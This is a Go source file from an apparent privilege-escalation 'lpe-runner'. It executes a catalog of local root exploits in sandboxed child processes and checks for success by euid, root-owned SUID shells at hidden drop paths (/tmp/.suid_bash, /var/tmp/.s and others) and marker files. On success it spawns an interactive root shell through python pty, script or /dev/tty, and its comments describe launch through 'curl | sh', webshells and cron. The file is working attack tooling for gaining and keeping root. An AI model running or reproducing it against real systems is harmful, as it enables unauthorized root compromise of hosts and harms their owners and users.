package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// runResult captures the outcome of one isolated exploit attempt.
type runResult struct {
	name      string
	cmd       string
	exitCode  int
	signal    string
	crashed   bool
	stdout    string
	stderr    string
	elapsed   time.Duration
	timedOut  bool
	rootAfter bool
	suidAfter bool
}

// Run an exploit in a fully isolated child process. The parent (this tool)
// NEVER crashes when the child crashes — signals, segfaults, panics inside
// the child are caught here and reported. We then re-check root status.
//
// hardTimeout caps wall-clock time. After it fires, the whole process group
// is SIGKILLed so the parent is never stuck waiting on a hung exploit.
func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) runResult {
	r := runResult{name: name, cmd: strings.Join(argv, " ")}
	if len(argv) == 0 {
		r.crashed = true
		r.stderr = "empty command"
		return r
	}

	bin, err := exec.LookPath(argv[0])
	if err != nil {
		if _, err2 := os.Stat(argv[0]); err2 != nil {
			r.crashed = true
			r.stderr = fmt.Sprintf("binary not found: %s", argv[0])
			return r
		}
		bin = argv[0]
	}

	// Apply resource limits so a single runaway exploit cannot OOM-kill
	// the whole server, fork-bomb it, or fill the disk. We use a /bin/sh
	// wrapper that calls `ulimit` before exec'ing the exploit, because
	// Go's syscall.SysProcAttr on Linux (go 1.21) has no Rlimit field.
	// This sets limits in the child process group only.
	argv = wrapWithUlimit(argv)
	bin = argv[0]

	c := exec.Command(bin, argv[1:]...)
	if dir != "" {
		c.Dir = dir
	}
	c.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
		// Pdeathsig: SIGKILL — if the parent (lpe-runner) dies, the child
		// is killed automatically so we never leave runaway exploits.
		Pdeathsig: syscall.SIGKILL,
	}

	// Open /dev/null and wire it to the child's stdin so NO exploit can
	// hang waiting for user input (e.g. sudo asking for a password, su,
	// passwd). The exploit gets immediate EOF on stdin and fails fast
	// instead of stalling until the timeout kills it.
	if devNull, err := os.Open("/dev/null"); err == nil {
		c.Stdin = devNull
		defer devNull.Close()
	} else {
		// /dev/null unavailable — use a zero-byte reader so the child
		// gets immediate EOF instead of inheriting the parent's stdin
		// (which could be a live TTY and cause interactive hangs).
		c.Stdin = strings.NewReader("")
	}

	var so, se strings.Builder
	c.Stdout = &so
	c.Stderr = &se

	start := time.Now()
	if err := c.Start(); err != nil {
		r.crashed = true
		r.stderr = fmt.Sprintf("start failed: %v", err)
		r.elapsed = time.Since(start)
		return r
	}

	pid := c.Process.Pid
	doneCh := make(chan error, 1)
	go func() { doneCh <- c.Wait() }()

	var waitErr error
	timedOut := false
	select {
	case waitErr = <-doneCh:
	case <-time.After(hardTimeout):
		timedOut = true
		killGroup(pid)
		select {
		case waitErr = <-doneCh:
		case <-time.After(5 * time.Second):
			waitErr = fmt.Errorf("process refused to die after SIGKILL")
		}
	}

	r.elapsed = time.Since(start)
	r.stdout = so.String()
	r.stderr = se.String()
	r.timedOut = timedOut

	if waitErr != nil {
		if ee, ok := waitErr.(*exec.ExitError); ok {
			r.exitCode = ee.ExitCode()
			if ws, ok := ee.Sys().(syscall.WaitStatus); ok {
				if ws.Signaled() {
					r.signal = ws.Signal().String()
					if is := ws.Signal(); is == syscall.SIGSEGV || is == syscall.SIGABRT ||
						is == syscall.SIGBUS || is == syscall.SIGFPE || is == syscall.SIGILL {
						r.crashed = true
					}
				}
			}
		} else {
			r.exitCode = -1
			r.stderr += " | " + waitErr.Error()
			r.crashed = true
		}
	}

	// The decisive question: did we become root, or did /bin/bash become
	// SUID, or did a known root-marker file appear?
	r.rootAfter = isRootNow()
	r.suidAfter = isSUIDBash()
	if !r.rootAfter {
		r.rootAfter = markerRooted()
	}
	return r
}

// killGroup SIGKILLs the entire process group led by pid, to clean up
// fork-heavy exploits that may hang.
func killGroup(pid int) {
	pgid, err := syscall.Getpgid(pid)
	if err == nil {
		_ = syscall.Kill(-pgid, syscall.SIGKILL)
	} else {
		_ = syscall.Kill(pid, syscall.SIGKILL)
	}
}

// isRootNow re-checks the *runner's* uid/euid.
func isRootNow() bool {
	return os.Geteuid() == 0
}

// suidShellPaths is the canonical list of paths where exploits drop a
// SUID bash shell. Kept in sync with what the static exploit binaries
// actually use (discovered via `strings` on each binary in the catalog).
// Examples: `exploit` drops /var/tmp/.s, pwnkitt drops /tmp/.suid_bash,
// our GTFOBins table drops /tmp/.sb.
var suidShellPaths = []string{
	"/bin/bash",
	"/usr/bin/bash",
	"/tmp/.sb",
	"/tmp/.suid_bash",
	"/tmp/.s",
	"/var/tmp/.s",
	"/var/tmp/bash",
	"/var/tmp/.suid_bash",
	"/dev/shm/.sb",
	"/dev/shm/.s",
	"/root/.sb",
}

// isSUIDBash checks whether any known drop path has a SUID-root shell.
// Uses isSUIDRootFile (which checks owner==root) to avoid false positives
// from user-owned SUID files.
func isSUIDBash() bool {
	for _, p := range suidShellPaths {
		if isSUIDRootFile(p) {
			return true
		}
	}
	return false
}

// isSUIDRootFile checks that a file (a) exists, (b) has the setuid bit,
// AND (c) is owned by root (uid 0). Checking only the SUID bit leads to
// false positives — any user can create a SUID file owned by themselves,
// which is useless for privilege escalation. Only root-owned SUID files
// actually grant root.
func isSUIDRootFile(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	// Must have the setuid bit.
	if fi.Mode()&os.ModeSetuid == 0 {
		return false
	}
	// Must be owned by root (uid 0).
	if stat, ok := fi.Sys().(*syscall.Stat_t); ok {
		return stat.Uid == 0
	}
	// On platforms where we can't read the owner, fall back to yes.
	return true
}

// isSUIDFile is kept for backward compat with the catalog (which only
// cares about the SUID bit on system binaries like /usr/bin/find).
func isSUIDFile(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSetuid != 0
}

// markerRooted checks for a marker file.
func markerRooted() bool {
	for _, p := range []string{"/tmp/.lpe_rooted", "/tmp/.lpe_suid_bash"} {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	return false
}

// rootspawn drops the runner into a real, interactive root shell when an
// exploit has clearly succeeded. It attaches a real PTY and reads from
// /dev/tty so the shell stays alive and interactive even when the runner
// itself was launched via `curl | sh` (whose stdin is a closed pipe).
//
// Returns true if a shell was actually spawned (regardless of whether the
// host had a TTY — on a no-TTY host we still exec the shell so the user can
// run it manually, and we report that).
func rootspawn(r *runResult) bool {
	var shellPath string
	var shellArgs []string

	// Prefer a SUID bash dropped by the exploit. Try the canonical list
	// (kept in sync with what each static binary actually writes).
	for _, p := range suidShellPaths {
		if isSUIDRootFile(p) {
			shellPath = p
			shellArgs = []string{"-p"}
			break
		}
	}
	// If the runner itself is root, use a plain shell. Prefer bash for
	// the SUID-style -p semantics, fall back to sh.
	if shellPath == "" && isRootNow() {
		if hasBin("bash") {
			shellPath = "/bin/bash"
		} else {
			shellPath = "/bin/sh"
		}
		shellArgs = []string{"-p"}
	}
	if shellPath == "" {
		return false
	}

	okf("%s succeeded — spawning interactive root shell (%s)", r.name, shellPath)
	okf("Type 'exit' to return to the runner (and continue testing).")
	fmt.Println(strings.Repeat("=", 60))

	// Attach a PTY so the shell behaves like a real terminal and stays
	// alive for interactive input. spawnPTY handles all three launch
	// contexts: interactive TTY, curl|sh (closed stdin pipe), and
	// no-TTY hosts (it falls back to a non-interactive exec + hint).
	spawnPTY(shellPath, shellArgs...)

	fmt.Println(strings.Repeat("=", 60))
	return true
}

// spawnPTY runs a command as an interactive shell wired to a real
// terminal. It must work in ALL three launch contexts:
//
//  1. Interactive TTY  — the runner was launched from a real shell.
//  2. curl|sh           — stdin is the closed download pipe, but the
//                          user's terminal is still reachable via /dev/tty.
//  3. No-TTY host       — CGI/webshell/nohup/cron: there is no controlling
//                          terminal at all. /dev/tty fails with ENXIO.
//
// The fundamental bug this fixes: under curl|sh the runner's os.Stdin is a
// CLOSED pipe. If we hand that to the shell (directly, or via python's
// pty.spawn which forwards fd 0 to the pty), the shell reads EOF instantly
// and exits with code 0 — so the user never gets a prompt. The fix is to
// open /dev/tty for ALL three standard fds so the shell talks to the real
// user terminal, not the dead pipe. On a no-TTY host we fall back to a
// non-interactive exec and print a clear hint with the SUID path.
func spawnPTY(bin string, args ...string) {
	// Try to open the controlling terminal. This succeeds in contexts 1
	// and 2 (the user's terminal exists even when stdin is a pipe) and
	// fails with ENXIO in context 3.
	tty, ttyErr := os.OpenFile("/dev/tty", os.O_RDWR, 0)

	// ── Context 3: no controlling terminal at all ──────────────────────
	// We cannot make an interactive shell without a terminal. Fall back
	// to a non-interactive exec so the user at least gets *a* shell (they
	// can pipe commands in), and print a clear hint with the SUID path
	// so they can re-run it from a real terminal.
	if ttyErr != nil {
		warnf("/dev/tty unavailable (%v) — no interactive terminal", ttyErr)
		infof("Run this from a real terminal to get an interactive root shell:")
		fmt.Printf("    %s %s\n", bin, strings.Join(args, " "))
		fmt.Println(strings.Repeat("-", 60))
		c := exec.Command(bin, args...)
		// Inherit whatever std fds we have. Under curl|sh stdin is a
		// closed pipe → the shell reads EOF and exits; that's the best
		// we can do without a tty. Under a webshell stdin may be a live
		// socket → the shell is usable.
		c.Stdin = os.Stdin
		c.Stdout = os.Stdout
		c.Stderr = os.Stderr
		// Do NOT Setpgid here — the shell must stay in the foreground
		// process group of whatever terminal/session it does have, or
		// it will get SIGTTIN on read and hang.
		_ = c.Run()
		return
	}
	defer tty.Close()

	// ── Contexts 1 & 2: we have a controlling terminal ────────────────
	// Prefer a real PTY. We try multiple methods in order of preference:
	//  1. python3 pty.spawn — most portable, does setsid+tcsetpgrp
	//  2. script(1)         — coreutils, available on most distros
	//  3. raw exec           — last resort, no job control but interactive
	//
	// All methods wire fd 0/1/2 to /dev/tty so the shell reads from the
	// real user terminal, not the dead curl|sh download pipe.

	// 1. python3 pty.spawn
	if hasBin("python3") {
		c := exec.Command("python3", "-c",
			fmt.Sprintf(
				"import pty,os,sys;sys.exit(pty.spawn([%s]+%s))",
				quotePy(bin), pyArgs(args)))
		c.Stdin = tty
		c.Stdout = tty
		c.Stderr = tty
		if err := c.Run(); err == nil {
			return
		}
		// If python3 failed (e.g. pty module unavailable on a stripped
		// box), fall through to the next method.
	}

	// 2. script(1) — allocates a real PTY. Available on virtually all
	// Linux distros (util-linux). `script -q -c '<cmd>' /dev/null`
	// runs <cmd> in a new PTY, quiet, no typescript file.
	if hasBin("script") {
		cmdStr := bin
		if len(args) > 0 {
			cmdStr += " " + strings.Join(args, " ")
		}
		c := exec.Command("script", "-q", "-c", cmdStr, "/dev/null")
		c.Stdin = tty
		c.Stdout = tty
		c.Stderr = tty
		if err := c.Run(); err == nil {
			return
		}
		// script failed — fall through to raw exec.
	}

	// ── Raw exec fallback (no python3, or python3 pty failed) ─────────
	// Run the shell with all three fds wired to /dev/tty. We do NOT use
	// Setpgid here: putting the shell in a new process group would make
	// it NOT the terminal's foreground pgid, so reads from /dev/tty would
	// deliver SIGTTIN and kill/hang the shell. By inheriting the runner's
	// session and foreground pgid, the shell can read the terminal
	// directly. (We lose Ctrl-C isolation, but interactivity is the
	// priority — the user asked for an interactive root shell.)
	c := exec.Command(bin, args...)
	c.Stdin = tty
	c.Stdout = tty
	c.Stderr = tty
	// Forward terminal signals to the child so Ctrl-C still works, then
	// stop intercepting once the child exits so we don't leak the
	// goroutine or swallow signals for the rest of the runner's lifetime.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	done := make(chan struct{})
	go func() {
		for {
			select {
			case <-done:
				return
			case sig := <-ch:
				if c.Process != nil {
					_ = syscall.Kill(c.Process.Pid, sig.(syscall.Signal))
				}
			}
		}
	}()
	_ = c.Run()
	close(done)
	signal.Stop(ch)
}

func quotePy(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `\'`) + "'"
}

func pyArgs(args []string) string {
	var b strings.Builder
	for i, a := range args {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(quotePy(a))
	}
	return "[" + b.String() + "]"
}

// report prints a one-line verdict for a single exploit attempt.
func (r *runResult) report() {
	tag := colG + "ROOT" + colZ
	if !r.rootAfter && !r.suidAfter {
		switch {
		case r.timedOut:
			tag = colY + "TIME" + colZ
		case r.crashed:
			tag = colR + "CRSH" + colZ
		case r.exitCode == 0:
			tag = colY + "NOP0" + colZ
		default:
			tag = colD + "FAIL" + colZ
		}
	}
	extra := ""
	if r.signal != "" {
		extra = fmt.Sprintf(" sig=%s", r.signal)
	}
	if r.timedOut {
		extra += " (timeout)"
	}
	fmt.Printf("  %s  %-26s  exit=%-3d  %6.1fs%s\n", tag, r.name, r.exitCode, r.elapsed.Seconds(), extra)
}

// wrapWithUlimit wraps an argv in a /bin/sh -c "ulimit ...; exec ..."
// so the exploit runs with hard resource caps. This is portable across
// all Linux distros (ulimit is a POSIX shell builtin) and does not
// depend on Go's SysProcAttr having an Rlimit field (go 1.21 lacks it).
//
// Limits are auto-tuned to the server's actual RAM (read from
// /proc/meminfo on Linux) so a tiny 512MB VPS and a 64GB box both get
// sane defaults without any manual config. The limits are always a
// fraction of total RAM so a single exploit can never OOM-kill the box.
//
// If /bin/sh is missing or /proc is unavailable, we fall back to fixed
// conservative defaults (better to run limited than to not run at all).
func wrapWithUlimit(argv []string) []string {
	if len(argv) == 0 {
		return argv
	}
	// Don't double-wrap if already wrapped.
	if argv[0] == "/bin/sh" && len(argv) > 1 && argv[1] == "-c" {
		return argv
	}
	// Build the ulimit command string + exec the real exploit.
	// Use exec so /bin/sh is replaced (no extra shell process lingers).
	ulimits := "ulimit " + autoUlimitFlags() + " 2>/dev/null;"
	// Shell-quote each argv element safely.
	parts := make([]string, 0, len(argv))
	for _, a := range argv {
		parts = append(parts, shellQuote(a))
	}
	cmdStr := ulimits + " exec " + strings.Join(parts, " ")
	return []string{"/bin/sh", "-c", cmdStr}
}

// autoUlimitFlags reads /proc/meminfo and returns ulimit flags tuned
// to the box. Strategy: cap each exploit to ~25% of total RAM, with a
// floor of 128MB and a ceiling of 1GB. Fork/fd/file limits are fixed
// (they don't depend on RAM). CPU time is fixed at 120s.
//
// Examples:
//   512 MB VPS → -v 131072 (128 MB)   25% would be too tight
//   2 GB box   → -v 524288 (512 MB)   25% of 2GB
//   8 GB box   → -v 1048576 (1 GB)    capped at 1GB
//   64 GB box  → -v 1048576 (1 GB)    capped at 1GB
func autoUlimitFlags() string {
	const (
		floorKB   = 128 * 1024       // 128 MB floor
		ceilingKB = 1024 * 1024     // 1 GB ceiling
		frac      = 4                // use 1/4 of total RAM
		forkLim   = 64               // max user processes
		fileLim   = 256 * 1024       // 256 MB max file size (KB)
		cpuLim   = 120               // 120s CPU
		fdLim    = 256               // open files
	)

	ramKB := readMemTotalKB() // 0 if unknown
	memKB := ramKB / frac
	if memKB < floorKB {
		memKB = floorKB
	}
	if memKB > ceilingKB {
		memKB = ceilingKB
	}
	return fmt.Sprintf("-v %d -u %d -f %d -t %d -n %d",
		memKB, forkLim, fileLim, cpuLim, fdLim)
}

// readMemTotalKB reads /proc/meminfo and returns MemTotal in KB.
// Returns 0 if /proc is unavailable (non-Linux) or unreadable.
// We do NOT cache this — it's called once per exploit, /proc is in
// page cache, and it's faster than a single syscall.
func readMemTotalKB() int64 {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	// First line is "MemTotal:       NNNN kB"
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				var n int64
				fmt.Sscanf(fields[1], "%d", &n)
				return n
			}
		}
	}
	return 0
}

// shellQuote wraps a string in single quotes for shell safety, escaping
// any embedded single quotes.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
